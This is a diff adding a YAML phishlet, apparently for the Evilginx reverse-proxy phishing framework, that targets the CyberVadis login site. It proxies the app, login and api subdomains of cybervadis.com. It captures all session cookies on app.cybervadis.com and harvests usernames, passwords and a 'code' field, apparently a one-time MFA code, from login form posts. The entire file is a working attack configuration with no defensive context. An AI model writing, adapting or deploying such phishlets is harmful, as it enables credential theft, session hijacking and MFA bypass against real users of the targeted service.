@@ -1,0 +1,37 @@
+name: 'CyberVadis'
+
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'app', orig_sub: 'app', domain: 'cybervadis.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'cybervadis.com', session: false, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'cybervadis.com', session: false, auto_filter: true}
+
+
+auth_tokens:
+  - domain: 'app.cybervadis.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+
+auth_urls:
+  - '/dashboard'
+
+credentials:
+  username:
+    key: '(username)'
+    search: '(.*)'
+    type: 'post'
+
+  password:
+    key: '(password)'
+    search: '(.*)'
+    type: 'post'
+
+  custom:
+    - key: 'code'
+      search: '(.*)'
+      type: 'post'
+
+login:
+  domain: 'app.cybervadis.com'
+  path: '/dashboard'
